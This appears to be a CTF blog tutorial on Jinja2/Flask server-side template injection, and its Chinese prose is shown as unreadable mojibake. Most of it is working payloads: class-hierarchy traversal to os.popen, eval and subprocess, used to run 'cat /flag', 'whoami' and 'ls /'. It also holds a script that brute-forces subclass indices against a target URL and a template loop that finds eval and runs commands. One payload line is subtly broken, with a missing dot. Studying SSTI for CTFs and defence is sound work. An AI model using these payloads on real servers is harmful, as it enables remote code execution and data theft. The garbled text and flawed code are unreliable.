<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DJANGO"><figure class="iseeu highlight /django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> user == â€˜westosâ€™%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">elif</span></span> user == â€˜helloâ€™ %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span>%&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>åœ¨jinja2ä¸­</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; ... &#125;</span><span class="language-xml">&#125;ï¼šè£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ä¼ è¿›æ¥çš„åŒåå‚æ•°è¿™ä¸ªå˜é‡ä»£è¡¨çš„å€¼æ›¿æ¢æ‰ã€‚</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;% ... %&#125;</span><span class="language-xml">ï¼šè£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥ã€‚</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;# <span class="name">...</span> #&#125;</span><span class="language-xml">ï¼šè£…è½½ä¸€ä¸ªæ³¨é‡Šï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ä¼šå¿½è§†è¿™ä¸­é—´çš„å€¼</span></span><br></pre></td></tr></table></figure></div>

<h1 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h1><p>å’Œbpå®éªŒå®¤ä¸­çš„sstiä¸åŒï¼Œæˆ‘è¿™é‡Œä¸»è¦é’ˆå¯¹jinjiaçš„sstiï¼Œå› ä¸ºè¿™æ˜¯flaskçš„é»˜è®¤æ¨¡æ¿, ä¸‹é¢çš„å†…å®¹ä¸»è¦æ¥è‡ªhello-ctf,æˆ‘è§‰å¾—è¯´å¾—å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘æŠŠä¸»è¦å†…å®¹è´´åœ¨ä¸‹é¢äº†ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å»çœ‹æºåœ°å€ <a href="https://hello-ctf.com/hc-web/ssti/#_7">https://hello-ctf.com/hc-web/ssti/#_7</a> </p>
<h2 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h2><p>å¯¹äºå¤§å¤šæ•°æ¨¡æ¿ï¼Œä»–ä»¬çš„å·¥ä½œæµç¨‹æˆ‘ä»¬å¯ä»¥è¿™æ ·æ¦‚æ‹¬ï¼š <code>å®šä¹‰æ¨¡æ¿ -&gt; ä¼ é€’æ•°æ® -&gt; æ¸²æŸ“æ¨¡æ¿ -&gt; è¾“å‡ºç”Ÿæˆ</code><br><img src="https://pic1.imgdb.cn/item/67d4365588c538a9b5bdb1cb.png"><br>æ¨¡æ¿æ³¨å…¥(Server-Side Template Injection) çš„åŸç†å’Œsqlæ³¨å…¥åŸç†å·®ä¸å¤šï¼Œéƒ½æ˜¯å› ä¸ºç”¨æˆ·çš„è¾“å…¥æ¥æ§åˆ¶æŸç§ç¨‹åºæµ<br>Jinja2 åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ <code>&#123;&#123;&#125;&#125;</code> åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥ <code>&#123;&#123;è¡¨è¾¾å¼&#125;&#125;</code> æ—¶ï¼Œè¡¨è¾¾å¼å°±ä¼šè¢«æ¸²æŸ“å™¨æ‰§è¡Œã€‚<br>æ¯”å¦‚è¾“å…¥<code>&#123;&#123;7 * 7&#125;&#125;</code> ä¼šæ¸²æŸ“æˆ49 </p>
<h2 id="ä¸€èˆ¬æµç¨‹"><a href="#ä¸€èˆ¬æµç¨‹" class="headerlink" title="ä¸€èˆ¬æµç¨‹"></a>ä¸€èˆ¬æµç¨‹</h2><p>åœ¨å¯ä»¥çš„åœ°æ–¹æ’å…¥<code>&#123;&#123;7 * 7&#125;&#125;</code> æˆ– <code>&#123;&#123;config&#125;&#125;</code> ç­‰ åœ¨é¡µé¢ä¸Šçœ‹æœ‰æ²¡æœ‰è§£æ æ¥ç¡®å®šæ˜¯å¦æœ‰æ³¨å…¥ç‚¹<br>ä¸€èˆ¬çš„wpçš„payloadéƒ½å·®ä¸å¤šæ˜¯è¿™æ ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[40](<span class="name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[257](<span class="name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__import__(<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">......</span></span><br></pre></td></tr></table></figure></div>
<p>ä¸ºä»€ä¹ˆéƒ½æ˜¯è¿™æ ·å­å‘¢ è¦å…ˆäº†è§£pythonä¸­çš„å‡ ä¸ªçŸ¥è¯†ç‚¹</p>
<ul>
<li>å¯¹è±¡ : åœ¨ Python ä¸­ ä¸€åˆ‡çš†ä¸ºå¯¹è±¡ ï¼Œå½“ä½ åˆ›å»ºä¸€ä¸ªåˆ—è¡¨ []ã€ä¸€ä¸ªå­—ç¬¦ä¸² â€œâ€ æˆ–ä¸€ä¸ªå­—å…¸ {} æ—¶ï¼Œä½ å®é™…ä¸Šæ˜¯åœ¨åˆ›å»ºä¸åŒç±»å‹çš„å¯¹è±¡ã€‚</li>
<li>ç»§æ‰¿ : æˆ‘ä»¬çŸ¥é“å¯¹è±¡æ˜¯ç±»çš„å®ä¾‹ï¼Œç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿ã€‚åœ¨æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œå…¶å®å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªç±»çš„å®ä¾‹ï¼Œè€Œåœ¨ python ä¸­æ‰€æœ‰çš„ç±»éƒ½ç»§æ‰¿äºä¸€ä¸ªåŸºç±»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹æ³•ï¼Œä»åˆ›å»ºçš„å¯¹è±¡åå‘æŸ¥æ‰¾å®ƒçš„ç±»ï¼Œä»¥åŠå¯¹åº”ç±»çˆ¶ç±»ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½ä»ä»»æ„ä¸€ä¸ªå¯¹è±¡å›åˆ°ç±»çš„ç«¯ç‚¹ï¼Œä¹Ÿå°±æ˜¯åŸºç±»ï¼Œå†ä»ç«¯ç‚¹ä»»æ„çš„å‘ä¸‹æŸ¥æ‰¾ã€‚</li>
<li>é­”æœ¯æ–¹æ³• : æˆ‘ä»¬å¦‚ä½•å»å®ç°åœ¨ç»§æ‰¿ä¸­æˆ‘ä»¬æåˆ°çš„è¿‡ç¨‹å‘¢ï¼Ÿè¿™å°±éœ€è¦åœ¨ä¸Šé¢ Payload ä¸­ç±»ä¼¼ <code>__class__</code> çš„é­”æœ¯æ–¹æ³•äº†ï¼Œé€šè¿‡æ‹¼æ¥ä¸åŒä½œç”¨çš„é­”æœ¯æ–¹æ³•æ¥æ“æ§ç±»ï¼Œæˆ‘ä»¬å°±èƒ½å®ç°æ–‡ä»¶çš„è¯»å–æˆ–è€…å‘½ä»¤çš„æ‰§è¡Œäº†ã€‚<br>æˆ‘ä»¬å¤§å¯ä»¥æŠŠæˆ‘ä»¬åœ¨ SSTI åšçš„äº‹æƒ…æŠ½è±¡æˆä¸‹é¢çš„ä»£ç ï¼š</li>
</ul>
<p>class O: pass # O æ˜¯åŸºç±»ï¼ŒAã€Bã€Fã€G éƒ½ç›´æ¥æˆ–é—´æ¥ç»§æ‰¿äºå®ƒ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç»§æ‰¿å…³ç³» A -&gt; B -&gt; O</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">O</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">B</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># F ç±»ç»§æ‰¿è‡ª Oï¼Œæ‹¥æœ‰è¯»å–æ–‡ä»¶çš„æ–¹æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>(<span class="title class_ inherited__">O</span>): <span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">self, file_name</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># G ç±»ç»§æ‰¿è‡ª Oï¼Œæ‹¥æœ‰æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">G</span>(<span class="title class_ inherited__">O</span>): <span class="keyword">def</span> <span class="title function_">exec</span>(<span class="params">self, command</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p>æ¯”å¦‚æˆ‘ä»¬ç°åœ¨å°±åªæ‹¿åˆ°äº† Aï¼Œä½†æˆ‘ä»¬æƒ³è¯»å–ç›®å½•ä¸‹é¢çš„ flag ï¼Œäºæ˜¯å°±æœ‰äº†ä¸‹é¢çš„å°è¯•ï¼š</p>
<p>æ‰¾å¯¹è±¡ A çš„ç±» - ç±» A -&gt; æ‰¾ç±» A çš„çˆ¶äº² - ç±» B -&gt; æ‰¾ç¥–å…ˆ &#x2F; åŸºç±» - ç±» O -&gt; éå†ç¥–å…ˆä¸‹é¢æ‰€æœ‰çš„å­ç±» -&gt; æ‰¾åˆ°å¯åˆ©ç”¨çš„ç±» ç±» F ç±» G-&gt; æ„é€ åˆ©ç”¨æ–¹æ³•-&gt; è¯»å†™æ–‡ä»¶ &#x2F; æ‰§è¡Œå‘½ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(A.__class__) <span class="comment"># ä½¿ç”¨ __class__ æŸ¥çœ‹ç±»å±æ€§</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.A&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(A.__class__.__base__) <span class="comment"># ä½¿ç”¨ __base__ æŸ¥çœ‹çˆ¶ç±»</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(A.__class__.__base__.__base__)<span class="comment"># æŸ¥çœ‹çˆ¶ç±»çš„çˆ¶ç±» (å¦‚æœç»§æ‰¿é“¾è¶³å¤Ÿé•¿ï¼Œå°±éœ€è¦å¤šä¸ªbase)</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.O&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(A.__class__.__mro__) <span class="comment"># ç›´æ¥ä½¿ç”¨ __mro__ æŸ¥çœ‹ç±»ç»§æ‰¿å…³ç³»é¡ºåº</span></span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.A&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.O&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(A.__class__.__base__.__base__.__subclasses__()) <span class="comment"># æŸ¥çœ‹ç¥–å…ˆä¸‹é¢æ‰€æœ‰çš„å­ç±»ï¼ˆè¿™é‡Œå‡å®šç¥–å…ˆä¸ºOï¼‰</span></span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.F&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.G&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure></div>
<p>åœ¨ Python ä¸­ï¼Œæ‰€æœ‰ç±»æœ€ç»ˆéƒ½ç»§æ‰¿è‡ªä¸€ä¸ªç‰¹æ®Šçš„åŸºç±»ï¼Œåä¸º objectã€‚è¿™æ˜¯æ‰€æœ‰ç±»çš„â€œç¥–å…ˆâ€ï¼Œæ‹¿åˆ°å®ƒå³å¯è·å– Python ä¸­æ‰€æœ‰çš„å­ç±»ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ›´å¤šé­”æœ¯æ–¹æ³•å¯ä»¥åœ¨ SSTI å¤‡å¿˜å½•éƒ¨åˆ†æŸ¥çœ‹</span></span><br><span class="line">__class__            ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚</span><br><span class="line">__base__             ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»</span><br><span class="line">__bases__            ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases__</span><br><span class="line">__mro__              æŸ¥çœ‹ç»§æ‰¿å…³ç³»å’Œè°ƒç”¨é¡ºåºï¼Œè¿”å›å…ƒç»„ã€‚æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚</span><br></pre></td></tr></table></figure></div>
<h3 id="æ‹¿åŸºç±»"><a href="#æ‹¿åŸºç±»" class="headerlink" title="æ‹¿åŸºç±»"></a>æ‹¿åŸºç±»</h3><p>ä¸‹é¢çš„è¿™ä¸ªä¾‹å­æ˜¯åˆ†åˆ«ç”¨<code>__mro__ __bases__ __base__ </code> æ‹¿åˆ°åŸºç±»çš„ç¤ºä¾‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.Request&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__mro__</span><br><span class="line"> (&lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.sansio.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;) <span class="comment"># è¿”å›ä¸ºå…ƒç»„</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.JSONMixin&#x27;</span>&gt;) <span class="comment"># è¿”å›ä¸ºå…ƒç»„</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__base__.__base__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>
<h3 id="å¯»æ‰¾å­ç±»"><a href="#å¯»æ‰¾å­ç±»" class="headerlink" title="å¯»æ‰¾å­ç±»"></a>å¯»æ‰¾å­ç±»</h3><p>å½“æˆ‘ä»¬æ‹¿åˆ°åŸºç±»ï¼Œä¹Ÿå°±æ˜¯ &lt;class â€˜objectâ€™&gt; æ—¶ï¼Œä¾¿å¯ä»¥ç›´æ¥ä½¿ç”¨ subclasses() è·å–åŸºç±»çš„æ‰€æœ‰å­ç±»äº†ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬åªå…³å¿ƒå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆ–è€…è¯»å–æ–‡ä»¶çš„å­ç±»ï¼Œä½†æ˜¯subclasseséå¸¸å¤šï¼Œæˆ‘ä»¬åªè¦ç¡®å®šå­ç±»æœ‰æ²¡æœ‰osæˆ–è€…fileçš„ç›¸å…³æ¨¡å—<br><img src="https://pic1.imgdb.cn/item/67d4394b88c538a9b5bdb2ed.png"><br>æ¯”å¦‚æˆ‘ä»¬ä»¥å­˜åœ¨ eval å‡½æ•°çš„ç±»ä¸ºä¾‹å­ï¼Œæˆ‘ä»¬ä¸éœ€è¦è®¤è¯†ç±»åï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ï¼Œè¿™ä¸ªç±»é€šè¿‡ <code>.__init__.__globals__.__builtins__[&#39;eval&#39;](&#39;&#39;)</code> çš„æ–¹å¼å¯ä»¥è°ƒç”¨ eval çš„æ¨¡å—å°±å¥½äº†ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">__init__             åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯<span class="keyword">function</span></span><br><span class="line">__globals__          ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–å‡½æ•°æ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚</span><br><span class="line">__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«.</span><br></pre></td></tr></table></figure></div>
<p>å…¶å®åœ¨é¢å‘å¯¹è±¡çš„è§’åº¦è§£é‡Šè¿™æ ·åšå¾ˆå®¹æ˜“ï¼Œå¯¹è±¡æ˜¯éœ€è¦åˆå§‹åŒ–çš„ï¼Œè€Œ <strong>init</strong> çš„ä½œç”¨å°±æ˜¯æŠŠæˆ‘ä»¬é€‰å–çš„å¯¹è±¡åˆå§‹åŒ–ï¼Œç„¶åå¦‚ä½•å»ä½¿ç”¨å¯¹è±¡ä¸­çš„æ–¹æ³•å‘¢ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ° <strong>globals</strong> æ¥è·å–å¯¹å…¨å±€å˜é‡æˆ–æ¨¡å—çš„å¼•ç”¨ã€‚<br>è¿™æ—¶å€™é—®é¢˜å°±æ¥äº†ï¼Œæˆ‘ä»¬åœ¨è·å–å­ç±»ä¹‹åï¼Œè¦æ€ä¹ˆæ‰¾åˆ°å†…å»ºå‡½æ•°æœ‰evalæˆ–è€…osç­‰çš„å‘¢<br>ç”¨pythonè„šæœ¬æˆ–è€…æ¨¡æ¿è¯­è¨€éƒ½èƒ½è‡ªåŠ¨åŒ–å®Œæˆè¿™ä¸ªè¿‡ç¨‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ python è„šæœ¬ ç”¨äºå¯»æ‰¾åºå·</span></span><br><span class="line">url = <span class="string">&quot;http://url/level/1&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_eval</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">find_eval(url)</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªcodeæ˜¯æˆ‘ä»¬æµ‹è¯•å‡ºæ¥çš„æ³¨å…¥ç‚¹ï¼Œä¹Ÿå¯ä»¥ç”¨æ¨¡æ¿è¯­è¨€ç›´æ¥æ‰¾åˆ°ä¹‹åå‘é€payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TWIG"><figure class="iseeu highlight /twig"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"> # æ¨¡æ¿è¯­æ³• _ å‘½ä»¤æ‰§è¡Œ_eval</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">if</span> x.__init__ is defined and x.__init__.__globals__ is defined and <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># eval </span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># os.py</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># popen</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># _frozen_importlib.BuiltinImporter</span></span><br><span class="line">x[NUM][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># linecache</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess.Popen</span></span><br><span class="line">x[NUM](<span class="string">&#x27;ls /&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()</span><br></pre></td></tr></table></figure></div>
<h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h3><p>ç”±äº Python2 ä¸­çš„ File ç±»åœ¨ Python3 ä¸­è¢«å»æ‰äº†ï¼Œæ‰€ä»¥ç›®å‰ä¹Ÿå°± FileLoader ( _frozen_importlib_external.FileLoader) ç®—çœŸæ­£æ„ä¹‰ä¸ŠåŸç”Ÿçš„æ–‡ä»¶è¯»å–</p>
